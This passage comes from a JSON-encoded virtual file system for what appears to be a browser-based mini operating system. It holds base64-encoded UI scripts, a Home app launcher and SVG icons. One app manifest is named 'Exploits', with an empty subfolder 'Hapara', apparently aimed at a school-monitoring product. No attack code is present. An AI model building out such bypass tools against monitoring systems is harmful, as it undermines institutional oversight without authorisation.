2RlYWN0aXZhdGVkJykgew0KICAgICAgICAgIHRoaXMuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgfQ0KICAgICAgfS5iaW5kKHZpZXcub3ZlcmxheSkpOw0KICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh2aWV3Lm92ZXJsYXkpOw0KICAgICAgdmlldy5pZnJhbWVDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgIHZpZXcuaWZyYW1lQ29udGFpbmVyLmNsYXNzTmFtZSA9ICdpZnJhbWVDb250YWluZXInOw0KICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh2aWV3LmlmcmFtZUNvbnRhaW5lcik7DQogICAgfSwNCiAgICByaWJib25CYXI6IHsNCiAgICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICB2YXIgaGVhZGVyOw0KICAgICAgICBoZWFkZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgaGVhZGVyLmNsYXNzTmFtZSA9ICdoZWFkZXInOw0KICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGhlYWRlcik7DQogICAgICAgIHZpZXcucmliYm9uQmFyLmhlYWRlciA9IGhlYWRlcjsNCiAgICAgIH0sDQogICAgICBhZGRUaXRsZTogZnVuY3Rpb24oKSB7DQogICAgICAgIHZhciBhcmdzID0gQXJyYXkuZnJvbShhcmd1bWVudHMpOw0KICAgICAgICB3aGlsZSAoYXJncy5sZW5ndGggIT09IDApIHsNCiAgICAgICAgICBsZXQgdHh0Ow0KICAgICAgICAgIGxldCB0eHRFbGVtOw0KICAgICAgICAgIHR4dCA9IGFyZ3Muc2hpZnQoKTsNCiAgICAgICAgICBpZiAodHlwZW9mIHR4dCA9PSAnc3RyaW5nJykgew0KICAgICAgICAgICAgdHh0ID0gew0KICAgICAgICAgICAgICB0aXRsZTogdHh0DQogICAgICAgICAgICB9Ow0KICAgICAgICAgIH0NCiAgICAgICAgICBjb250cm9sbGVyLmFkZEhpc3RvcnkodHh0KTsNCiAgICAgICAgICB0eHRFbGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgncCcpOw0KICAgICAgICAgIGlmICh0eHQub25jbGljaykgew0KICAgICAgICAgICAgdHh0RWxlbS5jbGFzc05hbWUgPSAnY2xpY2thYmxlJzsNCiAgICAgICAgICAgIHR4dEVsZW0uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCB0eHQub25jbGljayk7DQogICAgICAgICAgfQ0KICAgICAgICAgIHR4dEVsZW0uaW5uZXJUZXh0ID0gdHh0LnRpdGxlOw0KICAgICAgICAgIHZpZXcucmliYm9uQmFyLmhlYWRlci5hcHBlbmRDaGlsZCh0eHRFbGVtKTsNCiAgICAgICAgfQ0KICAgICAgfSwNCiAgICAgIGdldFRpdGxlOiBmdW5jdGlvbigpIHsNCiAgICAgICAgcmV0dXJuIGNvbnRyb2xsZXIuZ2V0SGlzdG9yeSgpOw0KICAgICAgfSwNCiAgICAgIGNsZWFyVGl0bGU6IGZ1bmN0aW9uKCkgew0KICAgICAgICBjb250cm9sbGVyLmNsZWFySGlzdG9yeSgpOw0KICAgICAgfSwNCiAgICAgIGNoYW5nZUNvbG9yOiBmdW5jdGlvbigpIHsNCiAgICAgIH0NCiAgICB9LA0KICAgIGhhbWJ1cmdlck1lbnU6IHsNCiAgICAgIGlzT3BlbjogZmFsc2UsDQogICAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgICAgdmlldy5oYW1idXJnZXJJY28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgdmlldy5oYW1idXJnZXJJY28uY2xhc3NOYW1lID0gJ2hhbWJ1cmdlckljbyBtZW51JzsNCiAgICAgICAgdmFyIGhhbWJ1cmdlckljb0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NwYW4nKTsNCiAgICAgICAgdmlldy5oYW1idXJnZXJJY28uYXBwZW5kQ2hpbGQoaGFtYnVyZ2VySWNvQmFyKTsNCiAgICAgICAgdmlldy5oYW1idXJnZXJJY28uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCB2aWV3LmhhbWJ1cmdlck1lbnUudG9nZ2xlKTsNCiAgICAgICAgdmlldy5yaWJib25CYXIuaGVhZGVyLmFwcGVuZENoaWxkKHZpZXcuaGFtYnVyZ2VySWNvKTsNCiAgICAgICAgdmlldy5oYW1idXJnZXJNZW51Lm1lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgdmlldy5oYW1idXJnZXJNZW51Lm1lbnUuY2xhc3NOYW1lID0gJ2hhbWJ1cmdlck1lbnUgbWVudUNsb3NlZCc7DQogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodmlldy5oYW1idXJnZXJNZW51Lm1lbnUpOw0KICAgICAgfSwNCiAgICAgIHRvZ2dsZTogZnVuY3Rpb24oKSB7DQogICAgICAgIGlmICh2aWV3LmhhbWJ1cmdlck1lbnUuaXNPcGVuKSB7DQogICAgICAgICAgdmlldy5oYW1idXJnZXJNZW51LmlzT3BlbiA9IGZhbHNlOw0KICAgICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS5tZW51LmNsYXNzTmFtZSA9ICdoYW1idXJnZXJNZW51IG1lbnVDbG9zZWQnOw0KICAgICAgICAgIHZpZXcub3ZlcmxheS5jbGFzc05hbWUgPSAnb3ZlcmxheSBvX2RlYWN0aXZhdGVkJzsNCiAgICAgICAgICB2aWV3LmhhbWJ1cmdlckljby5jbGFzc05hbWUgPSAnaGFtYnVyZ2VySWNvIG1lbnUnOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS5pc09wZW4gPSB0cnVlOw0KICAgICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS5tZW51LmNsYXNzTmFtZSA9ICdoYW1idXJnZXJNZW51IG1lbnVPcGVuZWQnOw0KICAgICAgICAgIHZpZXcuaGFtYnVyZ2VySWNvLmNsYXNzTmFtZSA9ICdoYW1idXJnZXJJY28gYmFjayc7DQogICAgICAgICAgdmlldy5vdmVybGF5LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgIHZpZXcub3ZlcmxheS5jbGFzc05hbWUgPSAnb3ZlcmxheSBvX2FjdGl2YXRlZCc7DQogICAgICAgIH0NCiAgICAgIH0sDQogICAgICBhZGQ6IGZ1bmN0aW9uKG9wdGlvbnMpIHsNCiAgICAgICAgdmFyIGl0ZW0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgaXRlbS5jbGFzc05hbWUgPSAnaGFtYnVyZ2VySXRlbSc7DQogICAgICAgIHZhciBpdGVtSWNvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7DQogICAgICAgIGl0ZW1JY28uc3JjID0gb3B0aW9ucy5wYXRoICsgb3B0aW9ucy5tYW5pZmVzdC5hY3Rpdml0aWVzLm1haW4uaWNvOw0KICAgICAgICBpdGVtLmFwcGVuZENoaWxkKGl0ZW1JY28pOw0KICAgICAgICB2YXIgaXRlbVRpdGxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgncCcpOw0KICAgICAgICBpdGVtVGl0bGUuaW5uZXJUZXh0ID0gb3B0aW9ucy5tYW5pZmVzdC5uYW1lOw0KICAgICAgICBpdGVtLmFwcGVuZENoaWxkKGl0ZW1UaXRsZSk7DQogICAgICAgIG9wdGlvbnMubWVudUVudHJ5ID0gaXRlbTsNCiAgICAgICAgaXRlbS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGFwcERldGFpbHMpIHsNCiAgICAgICAgICBpZiAoYXBwRGV0YWlscy5ydW5uaW5nID09ICdmb3JlZ3JvdW5kJykgew0KICAgICAgICAgICAgaWYgKHZpZXcuaGFtYnVyZ2VyTWVudS5pc09wZW4pIHsNCiAgICAgICAgICAgICAgdmlldy5oYW1idXJnZXJNZW51LnRvZ2dsZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBjb250cm9sbGVyLmFwcHMubGF1bmNoKGFwcERldGFpbHMpOw0KICAgICAgICAgIH0NCiAgICAgICAgfS5iaW5kKHRoaXMsIG9wdGlvbnMpKTsNCiAgICAgICAgaXRlbS5hZGRFdmVudExpc3RlbmVyKCd0cmFuc2l0aW9uZW5kJywgZnVuY3Rpb24oKSB7DQogICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsNCiAgICAgICAgICAgIGlmICh2aWV3LmhhbWJ1cmdlck1lbnUuaXNPcGVuKSB7DQogICAgICAgICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS50b2dnbGUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9LmJpbmQodGhpcyksIDIwKTsNCiAgICAgICAgfSk7DQogICAgICAgIHZpZXcuaGFtYnVyZ2VyTWVudS5tZW51LmFwcGVuZENoaWxkKGl0ZW0pOw0KICAgICAgfQ0KICAgIH0sDQogICAgcmVxdWVzdENob29zZXI6IHsNCiAgICAgIHJlcXVlc3Q6IGZ1bmN0aW9uKGFjdGl2aXR5TmFtZSwgb3B0aW9ucywgY2FsbGJhY2spIHsNCiAgICAgICAgY29udHJvbGxlci5hY3Rpdml0eU1hdGNoKGFjdGl2aXR5TmFtZSwgZnVuY3Rpb24ocmVzdWx0LCBlbGlnaWJsZUFwcCkgew0KICAgICAgICAgIGlmIChvcHRpb25zLmV4Y2x1c2l2ZSB8fCByZXN1bHQpIHsNCiAgICAgICAgICAgIC8qSXQncyBhYnNvbHV0ZWx5IG5lY2Vzc2FyeSB0byBkaXNwbGF5IHRoZSBkaWFsb2d1ZSB0byBzd2l0Y2ggYXBwcyovDQogICAgICAgICAgICBjb25zb2xlLmxvZygnRElTUExBWSBESUFMT0dVRScpOw0KICAgICAgICAgICAgY2FsbGJhY2soKTsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgY2FsbGJhY2soZWxpZ2libGVBcHApOw0KICAgICAgICAgIH0NCiAgICAgICAgfS5iaW5kKHRoaXMpKTsNCiAgICAgIH0sDQogICAgICBkaXNwbGF5OiBmdW5jdGlvbihvcHRpb25zKSB7DQogICAgICB9DQogICAgfSwNCiAgfTsNCg0KICBjb250cm9sbGVyLmluaXQoKTsNCn0pKCk7DQo=", "/system/res/drawable/menuLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTMgMThoMTh2LTJIM3Yyem0wLTVoMTh2LTJIM3Yyem0wLTd2MmgxOFY2SDN6Ii8+DQo8L3N2Zz4=", "/system/app/Home/script/app.js": "KGZ1bmN0aW9uKCkgew0KICB2YXIgbW9kZWw7DQogIHZhciBjb250cm9sbGVyOw0KICB2YXIgdmlldzsNCiAgbW9kZWwgPSB7DQogICAgaW5pdDogew0KICAgICAgaW5pdDogZnVuY3Rpb24oKSB7DQogICAgICAgIHdpbmRvdy50b3AucG9zdE1lc3NhZ2Uoew0KICAgICAgICAgIHJlcXVlc3Q6ICdMSVNUX1BBQ0tBR0VTJw0KICAgICAgICB9LCAnKicpOw0KICAgICAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIGZ1bmN0aW9uKG1zZykgew0KICAgICAgICAgIG1vZGVsLmhhbmRsZURhdGFbbXNnLmRhdGEucmVxdWVzdF0obXNnLmRhdGEuZGF0YSk7DQogICAgICAgIH0uYmluZCh0aGlzKSwgZmFsc2UpOw0KICAgICAgfQ0KICAgIH0sDQogICAgaGFuZGxlRGF0YTogew0KICAgICAgJ0xJU1RfUEFDS0FHRVMnOiBmdW5jdGlvbih1bnNvcnRlZEFwcHMpIHsNCiAgICAgICAgdmFyIGFwcHMgPSBbXTsNCiAgICAgICAgYXBwcyA9IGFwcHMuY29uY2F0KHVuc29ydGVkQXBwcy5zeXN0ZW0pOw0KICAgICAgICBhcHBzID0gYXBwcy5jb25jYXQodW5zb3J0ZWRBcHBzLnVzZXIpOw0KICAgICAgICBmb3IgKGxldCBpID0gYXBwcy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgew0KICAgICAgICAgIGFwcHNbaV0ubGF1bmNoYWJsZSA9IGZhbHNlOw0KICAgICAgICAgIGlmIChhcHBzW2ldLm1hbmlmZXN0LmFjdGl2aXRpZXMubWFpbikgew0KICAgICAgICAgICAgYXBwc1tpXS5sYXVuY2hhYmxlID0gdHJ1ZTsNCiAgICAgICAgICB9DQogICAgICAgICAgaWYgKGFwcHNbaV0ubGF1bmNoYWJsZSAmJiBhcHBzW2ldLm1hbmlmZXN0LmFjdGl2aXRpZXMubWFpbi5pY28pIHsNCiAgICAgICAgICAgIGFwcHNbaV0uaWNvUGF0aCA9IGFwcHNbaV0ucGF0aCArIGFwcHNbaV0ubWFuaWZlc3QuYWN0aXZpdGllcy5tYWluLmljbzsNCiAgICAgICAgICB9IGVsc2UgaWYgKGFwcHNbaV0ubWFuaWZlc3QuaWNvKSB7DQogICAgICAgICAgICBhcHBzW2ldLmljb1BhdGggPSBhcHBzW2ldLnBhdGggKyBhcHBzW2ldLm1hbmlmZXN0LmljbzsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgYXBwc1tpXS5pY29QYXRoID0gJ3Jlcy9kcmF3YWJsZS9maWxlLnN2Zyc7DQogICAgICAgICAgfQ0KICAgICAgICAgIGFwcHNbaV0gPSB7DQogICAgICAgICAgICAnVUlEJzogYXBwc1tpXS5tYW5pZmVzdC5VSUQsDQogICAgICAgICAgICAnbmFtZSc6IGFwcHNbaV0ubWFuaWZlc3QubmFtZSwNCiAgICAgICAgICAgICdpY29QYXRoJzogYXBwc1tpXS5pY29QYXRoLA0KICAgICAgICAgICAgJ2xhdW5jaGFibGUnOiBhcHBzW2ldLmxhdW5jaGFibGUNCiAgICAgICAgICB9Ow0KICAgICAgICB9DQogICAgICAgIGNvbnRyb2xsZXIuaW5pdC5hcHBMaXN0KGFwcHMpOw0KICAgICAgfSwNCiAgICAgICdMQVVOQ0hfUEFDS0FHRVMnOiBmdW5jdGlvbihzdGF0dXMpIHsNCiAgICAgIH0NCiAgICB9LA0KICAgIGFwcHM6IHsNCiAgICAgIGxhdW5jaDogZnVuY3Rpb24oVUlELCBhY3Rpdml0eSkgew0KICAgICAgICB3aW5kb3cudG9wLnBvc3RNZXNzYWdlKHsNCiAgICAgICAgICByZXF1ZXN0OiAnTEFVTkNIX1BBQ0tBR0VTJywNCiAgICAgICAgICBkYXRhOiB7DQogICAgICAgICAgICBVSUQ6IFVJRCwNCiAgICAgICAgICAgIGFjdGl2aXR5OiBhY3Rpdml0eSwNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IGZhbHNlDQogICAgICAgICAgfQ0KICAgICAgICB9LCAnKicpOw0KICAgICAgfQ0KICAgIH0NCiAgfTsNCiAgY29udHJvbGxlciA9IHsNCiAgICBpbml0OiB7DQogICAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgICAgbW9kZWwuaW5pdC5pbml0KCk7DQogICAgICAgIHZpZXcuaW5pdC5pbml0KCk7DQogICAgICB9LA0KICAgICAgYXBwTGlzdDogZnVuY3Rpb24oYXBwcykgew0KICAgICAgICB2aWV3LmluaXQubGlzdEFwcHMoYXBwcyk7DQogICAgICB9DQogICAgfSwNCiAgICBhcHBzOiB7DQogICAgICBsYXVuY2g6IGZ1bmN0aW9uKFVJRCwgYWN0aXZpdHkpIHsNCiAgICAgICAgbW9kZWwuYXBwcy5sYXVuY2goVUlELCBhY3Rpdml0eSk7DQogICAgICB9DQogICAgfQ0KICB9Ow0KICB2aWV3ID0gew0KICAgIGluaXQ6IHsNCiAgICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgICB2YXIgc2VjdGlvbnMgPSBbJ3NldHRpbmdzJywgJ2FwcHMnXTsNCiAgICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gc2VjdGlvbnMubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICBsZXQgc2VjdGlvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgICAgIHNlY3Rpb24uY2xhc3NOYW1lID0gJ2NhcmRTZWN0aW9uJzsNCiAgICAgICAgICBzZWN0aW9uLmlkID0gc2VjdGlvbnNbaV07DQogICAgICAgICAgbGV0IHRvcFNlY3Rpb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgICB0b3BTZWN0aW9uLmNsYXNzTmFtZSA9ICdzZWN0aW9uSGVhZGVyJzsNCiAgICAgICAgICBsZXQgc2VjdGlvbk5hbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdwJyk7DQogICAgICAgICAgc2VjdGlvbk5hbWUuaW5uZXJUZXh0ID0gc2VjdGlvbnNbaV07DQogICAgICAgICAgdG9wU2VjdGlvbi5hcHBlbmRDaGlsZChzZWN0aW9uTmFtZSk7DQogICAgICAgICAgc2VjdGlvbi5hcHBlbmRDaGlsZCh0b3BTZWN0aW9uKTsNCiAgICAgICAgICBsZXQgYm9keSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgICAgIGJvZHkuY2xhc3NOYW1lID0gJ2JvZHknOw0KICAgICAgICAgIGxldCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3AnKTsNCiAgICAgICAgICBsb2FkaW5nVGV4dC5jbGFzc05hbWUgPSAnbG9hZGluZyc7DQogICAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJUZXh0ID0gJ0xvYWRpbmcuLi4nOw0KICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQobG9hZGluZ1RleHQpOw0KICAgICAgICAgIHNlY3Rpb24uYXBwZW5kQ2hpbGQoYm9keSk7DQogICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZWN0aW9uKTsNCiAgICAgICAgfQ0KICAgICAgfSwNCiAgICAgIGxpc3RBcHBzOiBmdW5jdGlvbihhcHBzKSB7DQogICAgICAgIHZhciBhcHBDb250YWluZXIgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjYXBwcyAuYm9keScpOw0KICAgICAgICB3aGlsZSAoYXBwQ29udGFpbmVyLmNoaWxkcmVuLmxlbmd0aCkgew0KICAgICAgICAgIGFwcENvbnRhaW5lci5yZW1vdmVDaGlsZChhcHBDb250YWluZXIuY2hpbGRyZW5bMF0pOw0KICAgICAgICB9DQogICAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IGFwcHMubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgICBsZXQgYXBwSXRlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgICAgIGFwcEl0ZW0uY2xhc3NOYW1lID0gJ2FwcExpc3RJdGVtJzsNCiAgICAgICAgICBsZXQgY2VudGVyVmVydGljYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgICBjZW50ZXJWZXJ0aWNhbC5jbGFzc05hbWUgPSAnY2VudGVyVmVydGljYWwnOw0KICAgICAgICAgIGxldCBpY29Db250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgICBpY29Db250YWluZXIuY2xhc3NOYW1lID0gJ2ljb0NvbnRhaW5lcic7DQogICAgICAgICAgbGV0IGFwcEljbyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2ltZycpOw0KICAgICAgICAgIGFwcEljby5zcmMgPSBhcHBzW2ldLmljb1BhdGg7DQogICAgICAgICAgaWNvQ29udGFpbmVyLmFwcGVuZENoaWxkKGFwcEljbyk7DQogICAgICAgICAgaWYgKGFwcHNbaV0ubGF1bmNoYWJsZSkgew0KICAgICAgICAgICAgYXBwSWNvLmNsYXNzTmFtZSA9ICdsYXVuY2hhYmxlJzsNCiAgICAgICAgICAgIGxldCBsYXVuY2hJY28gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTsNCiAgICAgICAgICAgIGxhdW5jaEljby5jbGFzc05hbWUgPSAnbGF1bmNoSWNvJzsNCiAgICAgICAgICAgIGxhdW5jaEljby5zcmMgPSAncmVzL2RyYXdhYmxlL2xhdW5jaEFwcC5zdmcnOw0KICAgICAgICAgICAgbGF1bmNoSWNvLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgIGNvbnRyb2xsZXIuYXBwcy5sYXVuY2goYXBwc1tpXS5VSUQsICdtYWluJyk7DQogICAgICAgICAgICB9LmJpbmQodGhpcykpOw0KICAgICAgICAgICAgaWNvQ29udGFpbmVyLmFwcGVuZENoaWxkKGxhdW5jaEljbyk7DQogICAgICAgICAgfQ0KICAgICAgICAgIGNlbnRlclZlcnRpY2FsLmFwcGVuZENoaWxkKGljb0NvbnRhaW5lcik7DQogICAgICAgICAgYXBwSXRlbS5hcHBlbmRDaGlsZChjZW50ZXJWZXJ0aWNhbCk7DQogICAgICAgICAgbGV0IGNlbnRlclRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgICBjZW50ZXJUZXh0LmNsYXNzTmFtZSA9ICdjZW50ZXJWZXJ0aWNhbCc7DQogICAgICAgICAgbGV0IGFwcE5hbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdwJyk7DQogICAgICAgICAgYXBwTmFtZS5pbm5lclRleHQgPSBhcHBzW2ldLm5hbWU7DQogICAgICAgICAgY2VudGVyVGV4dC5hcHBlbmRDaGlsZChhcHBOYW1lKTsNCiAgICAgICAgICBhcHBJdGVtLmFwcGVuZENoaWxkKGNlbnRlclRleHQpOw0KICAgICAgICAgIGFwcENvbnRhaW5lci5hcHBlbmRDaGlsZChhcHBJdGVtKTsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfTsNCiAgY29udHJvbGxlci5pbml0LmluaXQoKTsNCn0pKCk7DQo=", "/system/res/drawable/saveLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTE3IDNINWMtMS4xMSAwLTIgLjktMiAydjE0YzAgMS4xLjg5IDIgMiAyaDE0YzEuMSAwIDItLjkgMi0yVjdsLTQtNHptLTUgMTZjLTEuNjYgMC0zLTEuMzQtMy0zczEuMzQtMyAzLTMgMyAxLjM0IDMgMy0xLjM0IDMtMyAzem0zLTEwSDVWNWgxMHY0eiIvPg0KPC9zdmc+", "/system/res/drawable/pluginDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDEwYy0xLjEgMC0yIC45LTIgMnMuOSAyIDIgMiAyLS45IDItMi0uOS0yLTItMnptNy03SDVjLTEuMTEgMC0yIC45LTIgMnYxNGMwIDEuMS44OSAyIDIgMmgxNGMxLjExIDAgMi0uOSAyLTJWNWMwLTEuMS0uODktMi0yLTJ6bS0xLjc1IDljMCAuMjMtLjAyLjQ2LS4wNS42OGwxLjQ4IDEuMTZjLjEzLjExLjE3LjMuMDguNDVsLTEuNCAyLjQyYy0uMDkuMTUtLjI3LjIxLS40My4xNWwtMS43NC0uN2MtLjM2LjI4LS43Ni41MS0xLjE4LjY5bC0uMjYgMS44NWMtLjAzLjE3LS4xOC4zLS4zNS4zaC0yLjhjLS4xNyAwLS4zMi0uMTMtLjM1LS4yOWwtLjI2LTEuODVjLS40My0uMTgtLjgyLS40MS0xLjE4LS42OWwtMS43NC43Yy0uMTYuMDYtLjM0IDAtLjQzLS4xNWwtMS40LTIuNDJjLS4wOS0uMTUtLjA1LS4zNC4wOC0uNDVsMS40OC0xLjE2Yy0uMDMtLjIzLS4wNS0uNDYtLjA1LS42OSAwLS4yMy4wMi0uNDYuMDUtLjY4bC0xLjQ4LTEuMTZjLS4xMy0uMTEtLjE3LS4zLS4wOC0uNDVsMS40LTIuNDJjLjA5LS4xNS4yNy0uMjEuNDMtLjE1bDEuNzQuN2MuMzYtLjI4Ljc2LS41MSAxLjE4LS42OWwuMjYtMS44NWMuMDMtLjE3LjE4LS4zLjM1LS4zaDIuOGMuMTcgMCAuMzIuMTMuMzUuMjlsLjI2IDEuODVjLjQzLjE4LjgyLjQxIDEuMTguNjlsMS43NC0uN2MuMTYtLjA2LjM0IDAgLjQzLjE1bDEuNCAyLjQyYy4wOS4xNS4wNS4zNC0uMDguNDVsLTEuNDggMS4xNmMuMDMuMjMuMDUuNDYuMDUuNjl6Ii8+DQo8L3N2Zz4=", "/system/res/drawable/cancelLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTkgNi40MUwxNy41OSA1IDEyIDEwLjU5IDYuNDEgNSA1IDYuNDEgMTAuNTkgMTIgNSAxNy41OSA2LjQxIDE5IDEyIDEzLjQxIDE3LjU5IDE5IDE5IDE3LjU5IDEzLjQxIDEyeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/replayLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDVWMUw3IDZsNSA1VjdjMy4zMSAwIDYgMi42OSA2IDZzLTIuNjkgNi02IDYtNi0yLjY5LTYtNkg0YzAgNC40MiAzLjU4IDggOCA4czgtMy41OCA4LTgtMy41OC04LTgtOHoiLz4NCjwvc3ZnPg==", "/system/app/Exploit/manifest.json": "ew0KCSJVSUQiOiJzdG9ja19leHBsb2l0IiwNCgkibmFtZSI6IkV4cGxvaXRzIiwNCgkiaWNvIjoicmVzL2RyYXdhYmxlL2Zhdmljby5zdmciLA0KCSJhY3Rpdml0aWVzIjp7DQoJCSJtYWluIjogew0KCQkJImljbyI6InJlcy9kcmF3YWJsZS9mYXZpY28uc3ZnIiwNCgkJCSJwYXRoIjoiaW5kZXguaHRtbCINCgkJfQ0KCX0sDQoJInBlcm1pc3Npb25zIjpbDQoJXQ0KfQ==", "/system/app/Exploit/Exploits/Hapara": {}, "/system/res/drawable/menuDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTMgMThoMTh2LTJIM3Yyem0wLTVoMTh2LTJIM3Yyem0wLTd2MmgxOFY2SDN6Ii8+DQo8L3N2Zz4=", "/system/app/Home/script": {}, "/system/res/drawable/homeLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTAgMjB2LTZoNHY2aDV2LThoM0wxMiAzIDIgMTJoM3Y4eiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/cancelDark.svg": 